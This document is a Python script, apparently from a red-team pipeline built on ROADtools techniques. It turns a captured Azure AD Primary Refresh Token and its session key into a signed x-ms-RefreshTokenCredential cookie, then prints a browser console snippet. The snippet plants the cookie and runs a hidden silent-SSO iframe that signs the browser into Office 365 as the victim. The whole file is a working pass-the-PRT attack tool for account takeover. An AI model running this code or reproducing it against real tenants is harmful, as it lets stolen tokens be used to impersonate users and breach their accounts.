#!/usr/bin/env python3
"""
PRT snippet generator (DRS stage 6, browser path).

Loads a PRT and session key from drs_out, acquires a srv_challenge nonce,
mints the x-ms-RefreshTokenCredential cookie, and prints a JavaScript
snippet that sets the cookie and triggers silent SSO in a browser.

Unlike prt_cookie.py, this does not redeem the cookie server-side. The
browser does that when the snippet runs: the iframe hits the authorize
endpoint with prompt=none, the SSO cookie authenticates the request, and
the top-level navigation lands on the target site signed in.

Reference:
  ROADtoken's output format, and roadtools/roadlib/auth.py:
    create_prt_cookie_kdf_ver_2
    calculate_derived_key_v2

Inputs:
  drs_out/<stem>.prt.json
  drs_out/<stem>.session.key.bin
"""

import argparse
import base64
import json
import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, Optional, Tuple

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.kbkdf import (
    CounterLocation, KBKDFHMAC, Mode,
)


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
NONCE_ENDPOINT = "https://login.microsoftonline.com/common/oauth2/token"
KDF_LABEL = b"AzureAD-SecureConversation"

# Defaults matching the reference snippet.
DEFAULT_CLIENT_ID = "4765445b-32c6-49b0-83e6-1d93765276ca"
DEFAULT_REDIRECT_URI = "https://www.office.com/landing"
DEFAULT_SCOPE = "openid profile"
DEFAULT_TARGET_URL = "https://www.office.com/?auth=2"
DEFAULT_DOMAIN_HINT = "organizations"


# ---------------------------------------------------------------------------
# Base64
# ---------------------------------------------------------------------------

def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


# ---------------------------------------------------------------------------
# Nonce
# ---------------------------------------------------------------------------

def _post_form(endpoint: str, form: Dict[str, Any],
               timeout: float = 30.0) -> Tuple[int, Dict[str, str], bytes]:
    body = urllib.parse.urlencode(form, doseq=True).encode("utf-8")
    req = urllib.request.Request(
        endpoint, data=body, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers or {}), e.read()


def acquire_nonce(timeout: float = 30.0) -> str:
    form = {"grant_type": "srv_challenge"}
    status, _headers, body = _post_form(NONCE_ENDPOINT, form, timeout=timeout)
    text = body.decode("utf-8", errors="replace") if body else ""
    if not (200 <= status < 300):
        raise RuntimeError(f"srv_challenge failed: HTTP {status}: {text[:400]}")
    parsed = json.loads(text) if text else {}
    nonce = parsed.get("Nonce") or parsed.get("nonce")
    if not nonce:
        raise RuntimeError(f"srv_challenge response had no Nonce field: {parsed}")
    return nonce


# ---------------------------------------------------------------------------
# KDF (from ROADtools auth.py)
# ---------------------------------------------------------------------------

def _calculate_derived_key(session_key: bytes, context: bytes) -> bytes:
    kdf = KBKDFHMAC(
        algorithm=hashes.SHA256(),
        mode=Mode.CounterMode,
        length=32,
        rlen=4,
        llen=4,
        location=CounterLocation.BeforeFixed,
        label=KDF_LABEL,
        context=context,
        fixed=None,
        backend=default_backend(),
    )
    return kdf.derive(session_key)


def _calculate_derived_key_v2(session_key: bytes, context: bytes,
                              jwt_body: bytes) -> bytes:
    digest = hashes.Hash(hashes.SHA256())
    digest.update(context)
    digest.update(jwt_body)
    kdf_context = digest.finalize()
    return _calculate_derived_key(session_key, kdf_context)


# ---------------------------------------------------------------------------
# Cookie construction
# ---------------------------------------------------------------------------

def _sign_hs256(key: bytes, header_b64: str, payload_b64: str) -> bytes:
    import hmac
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    return hmac.new(key, signing_input, "sha256").digest()


def create_prt_cookie(prt: str, session_key: bytes, nonce: str) -> str:
    """Return the x-ms-RefreshTokenCredential JWS (KDF v2)."""
    context = os.urandom(24)
    payload = {
        "refresh_token": prt,
        "is_primary": "true",
        "request_nonce": nonce,
    }
    header = {
        "alg": "HS256",
        "ctx": base64.b64encode(context).decode("ascii"),
        "kdf_ver": 2,
        "typ": "JWT",
    }

    header_b64 = _b64url(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_b64 = _b64url(json.dumps(payload, separators=(",", ":")).encode("utf-8"))

    jwt_body = _b64url_decode(payload_b64)
    derived_key = _calculate_derived_key_v2(session_key, context, jwt_body)
    signature_b64 = _b64url(_sign_hs256(derived_key, header_b64, payload_b64))

    return f"{header_b64}.{payload_b64}.{signature_b64}"


# ---------------------------------------------------------------------------
# JavaScript snippet (matching the reference format)
# ---------------------------------------------------------------------------

def build_snippet(cookie: str,
                  upn: str,
                  tenant: str,
                  client_id: str,
                  redirect_uri: str,
                  scope: str,
                  target_url: str,
                  domain_hint: str) -> str:
    """Return the browser-side JavaScript that installs the SSO cookie and
    triggers silent auth, matching the format in the reference snippet."""
    # Nonce for the iframe authorize request. Distinct from the
    # srv_challenge nonce in the cookie itself.
    iframe_nonce = base64.b64encode(os.urandom(48)).decode("ascii")
    state = str(int(time.time() * 1000))

    iframe_params = {
        "client_id": client_id,
        "response_type": "code id_token",
        "redirect_uri": redirect_uri,
        "scope": scope,
        "login_hint": upn,
        "domain_hint": domain_hint,
        "prompt": "none",
        "nonce": iframe_nonce,
        "state": state,
    }
    iframe_url = (
        f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize?"
        + urllib.parse.urlencode(iframe_params)
    )

    bare = (
        f"x-ms-RefreshTokenCredential={cookie}; "
        f"path=/; secure; samesite=none"
    )
    scoped = (
        f"x-ms-RefreshTokenCredential={cookie}; "
        f"path=/; domain=.login.microsoftonline.com; secure; samesite=none"
    )

    # One continuous JavaScript statement, matching the reference.
    return (
        f'document.cookie="{bare}";'
        f'document.cookie="{scoped}";'
        f'console.log("SSO cookies set for {upn}...");'
        f'var f=document.createElement("iframe");'
        f'f.style.display="none";'
        f'f.src="{iframe_url}";'
        f'document.body.appendChild(f);'
        f'setTimeout(function(){{location.href="{target_url}";}},3000);'
    )


# ---------------------------------------------------------------------------
# Artifact loading
# ---------------------------------------------------------------------------

def _find_latest_prt(out_dir: Path) -> Optional[Path]:
    if not out_dir.exists():
        return None
    files = sorted(out_dir.glob("*.prt.json"),
                   key=lambda p: p.stat().st_mtime, reverse=True)
    return files[0] if files else None


def _load_prt_and_session_key(out_dir: Path) -> Tuple[str, bytes, Dict[str, Any]]:
    prt_path = _find_latest_prt(out_dir)
    if prt_path is None:
        raise RuntimeError(f"no .prt.json found in {out_dir}")
    data = json.loads(prt_path.read_text(encoding="utf-8"))
    prt = data.get("prt")
    if not prt:
        raise RuntimeError(f"{prt_path} had no 'prt' field")

    stem = prt_path.name[: -len(".prt.json")]
    sk_path = out_dir / f"{stem}.session.key.bin"
    if not sk_path.exists():
        raise RuntimeError(f"session key not found at {sk_path}")

    session_key = sk_path.read_bytes()
    if len(session_key) != 32:
        try:
            hex_key = bytes.fromhex(session_key.decode("ascii").strip())
            if len(hex_key) == 32:
                session_key = hex_key
        except Exception:
            pass
    if len(session_key) != 32:
        raise RuntimeError(
            f"session key at {sk_path} is {len(session_key)} bytes, "
            f"expected 32; the file may not be the raw key"
        )
    return prt, session_key, data


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main(argv=None) -> int:
    p = argparse.ArgumentParser(description="Print a PRT browser snippet (stage 6).")

    p.add_argument("--out-dir", default="drs_out")
    p.add_argument("--enrollment-dir", default=None,
                   help="Per-enrollment directory containing prt.json and "
                        "session.key.bin. Overrides --out-dir.")
    p.add_argument("--prt", default=None)
    p.add_argument("--session-key", default=None,
                   help="Session key as hex (overrides file)")
    p.add_argument("--nonce", default=None,
                   help="srv_challenge nonce (acquired automatically if omitted)")

    p.add_argument("--client-id", default=DEFAULT_CLIENT_ID,
                   help=f"Client for the iframe authorize request (default: {DEFAULT_CLIENT_ID})")
    p.add_argument("--redirect-uri", default=DEFAULT_REDIRECT_URI,
                   help=f"Redirect URI for the iframe (default: {DEFAULT_REDIRECT_URI})")
    p.add_argument("--scope", default=DEFAULT_SCOPE,
                   help=f"Scope for the iframe (default: {DEFAULT_SCOPE})")
    p.add_argument("--target", default=DEFAULT_TARGET_URL,
                   help=f"Page to navigate to after cookie is set (default: {DEFAULT_TARGET_URL})")
    p.add_argument("--domain-hint", default=DEFAULT_DOMAIN_HINT,
                   help=f"domain_hint for the iframe (default: {DEFAULT_DOMAIN_HINT})")

    p.add_argument("--tenant", default="common",
                   help="Tenant to use in the authorize URL (default: common)")
    p.add_argument("--timeout", type=float, default=30.0)
    p.add_argument("--raw", action="store_true",
                   help="Print only the JavaScript snippet, no comments")

    args = p.parse_args(argv)

    if args.prt and args.session_key:
        prt = args.prt
        session_key = bytes.fromhex(args.session_key.strip())
        meta = {}
    elif args.enrollment_dir:
        ed = Path(args.enrollment_dir)
        prt_file = ed / "prt.json"
        sk_file = ed / "session.key.bin"
        meta_file = ed / "meta.json"
        if not (prt_file.exists() and sk_file.exists()):
            print(f"[!] {ed} is missing prt.json or session.key.bin", file=sys.stderr)
            return 2
        data = json.loads(prt_file.read_text(encoding="utf-8"))
        prt = data.get("prt")
        if not prt:
            print(f"[!] {prt_file} had no 'prt' field", file=sys.stderr)
            return 2
        session_key = sk_file.read_bytes()
        if len(session_key) != 32:
            print(f"[!] session key is {len(session_key)} bytes, expected 32", file=sys.stderr)
            return 2
        meta = json.loads(meta_file.read_text(encoding="utf-8")) if meta_file.exists() else {}
    else:
        prt, session_key, meta = _load_prt_and_session_key(Path(args.out_dir))

    nonce = args.nonce or acquire_nonce(timeout=args.timeout)
    cookie = create_prt_cookie(prt, session_key, nonce)

    upn = meta.get("upn") or "(unknown)"

    snippet = build_snippet(
        cookie=cookie,
        upn=upn,
        tenant=args.tenant,
        client_id=args.client_id,
        redirect_uri=args.redirect_uri,
        scope=args.scope,
        target_url=args.target,
        domain_hint=args.domain_hint,
    )

    if args.raw:
        print(snippet)
        return 0

    print()
    print(f"# Browser snippet for {upn}")
    print(f"# minted at: {datetime.now(timezone.utc).isoformat()}")
    print(f"# valid for: ~5 minutes")
    print(f"# paste into devtools console on any login.microsoftonline.com page")
    print()
    print(snippet)
    print()
    return 0


if __name__ == "__main__":
    sys.exit(main())